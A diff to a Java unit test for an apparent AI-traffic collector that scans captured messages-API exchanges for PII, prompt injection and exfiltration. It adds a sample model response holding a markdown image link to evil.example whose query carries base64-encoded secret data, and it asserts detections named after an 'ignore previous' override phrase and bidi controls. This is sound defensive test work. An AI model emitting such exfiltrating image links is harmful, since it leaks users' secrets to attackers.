@@ -89,23 +89,30 @@ class CollectorTest {
                              .addHeaders(Header.newBuilder().setName("content-type").setValue("image/png"))
                              .setBody(Body.newBuilder().setData(ByteString.copyFromUtf8("png")))))),
                      capture(2, Capture.newBuilder().setTunnel(TunnelSummary.getDefaultInstance())),
-                     // 3 counts as lost once the jump puts it more than the reorder window behind.
-                     capture(4 + CaptureGapTracker.REORDER_WINDOW,
+                     capture(3, Capture.newBuilder().setHttp(HttpExchange.newBuilder()
+                         .setConnectHost("api.anthropic.com")
+                         .setRequest(HttpRequest.newBuilder().setMethod("POST").setTarget("/v1/messages"))
+                         .setResponse(HttpResponse.newBuilder()
+                             .addHeaders(Header.newBuilder().setName("content-type").setValue("application/json"))
+                             .setBody(Body.newBuilder().setData(ByteString.copyFromUtf8(
+                                 "{\"content\":[{\"type\":\"text\",\"text\":\"![x](https://evil.example/p.png?d=c2VjcmV0IHRva2Vu)\"}]}")))))),
+                     // 4 counts as lost once the jump puts it more than the reorder window behind.
+                     capture(5 + CaptureGapTracker.REORDER_WINDOW,
                              Capture.newBuilder().setTunnel(TunnelSummary.getDefaultInstance())));
             }
             final long deadline = System.nanoTime() + Duration.ofSeconds(2).toNanos();
-            while (collector.captureCounts().values().stream().mapToLong(Long::longValue).sum() < 3
+            while (collector.captureCounts().values().stream().mapToLong(Long::longValue).sum() < 4
                    && System.nanoTime() < deadline) {
                 Thread.sleep(5);
             }
-            assertEquals(Map.of(Capture.PayloadCase.HTTP, 1L, Capture.PayloadCase.TUNNEL, 2L), collector.captureCounts());
+            assertEquals(Map.of(Capture.PayloadCase.HTTP, 2L, Capture.PayloadCase.TUNNEL, 2L), collector.captureCounts());
 
             final Map<String, Long> coverage = new HashMap<>();
             for (Delta d : collector.logSummary()) {
                 coverage.put(d.metric() + "[" + d.dimension() + "]", d.delta());
             }
             assertEquals(Map.ofEntries(Map.entry(CoverageMetric.PROXY_CAPTURES_DROPPED_QUEUE_FULL + "[p]", 2L),
-                                       Map.entry(CoverageMetric.CAPTURES_RECEIVED + "[]", 3L),
+                                       Map.entry(CoverageMetric.CAPTURES_RECEIVED + "[]", 4L),
                                        Map.entry(CoverageMetric.SCHEMA_SURVEY + "[messages_api req:$.model:string]", 1L),
                                        Map.entry(CoverageMetric.SCHEMA_SURVEY + "[messages_api req:$.messages[].content:string]", 1L),
                                        Map.entry(CoverageMetric.SCHEMA_SURVEY + "[messages_api req:$.messages[].role:string]", 1L),
@@ -113,6 +120,10 @@ class CollectorTest {
                                        Map.entry(CoverageMetric.DETECTIONS + "[PII email UNKNOWN messages_api]", 1L),
                                        Map.entry(CoverageMetric.DETECTIONS + "[INJECTION phrase:ignore_previous UNKNOWN messages_api]", 1L),
                                        Map.entry(CoverageMetric.DETECTIONS + "[INJECTION bidi_control UNKNOWN messages_api]", 1L),
+                                       Map.entry(CoverageMetric.SCHEMA_SURVEY + "[messages_api resp:$.content[].type:string]", 1L),
+                                       Map.entry(CoverageMetric.SCHEMA_SURVEY + "[messages_api resp:$.content[].text:string]", 1L),
+                                       Map.entry(CoverageMetric.SEGMENTS_LABELED + "[MODEL_OUTPUT INBOUND]", 1L),
+                                       Map.entry(CoverageMetric.DETECTIONS + "[EXFIL md_image_query MODEL_OUTPUT messages_api]", 1L),
                                        Map.entry(CoverageMetric.BODY_SKIPPED + "[image/png]", 1L),
                                        Map.entry(CoverageMetric.CAPTURE_ID_GAP + "[p]", 1L)),
                          coverage);
